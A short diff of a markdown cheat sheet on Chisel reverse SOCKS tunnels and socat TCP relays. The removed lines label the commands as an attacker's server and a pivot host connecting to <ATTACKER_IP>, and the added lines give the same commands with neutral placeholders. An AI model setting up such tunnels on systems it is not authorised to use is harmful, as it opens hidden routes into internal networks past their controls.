@@ -1,13 +1,8 @@
-# Chisel & Socat Tunnelling
+# Chisel / Socat Patterns
 
-## Chisel – Reverse SOCKS
-Attacker:
+## Chisel SOCKS proxy
+# On VPS/server: chisel server -p <PORT> --reverse
+# On client:     chisel client <SERVER_IP>:<PORT> R:socks
 
-chisel server -p 8000 --reverse
-Pivot:
-
-
-chisel client <ATTACKER_IP>:8000 R:socks
-Socat – Port Forward
-
-socat TCP-LISTEN:8080,fork TCP:10.0.0.5:80
+## Socat TCP relay
+socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
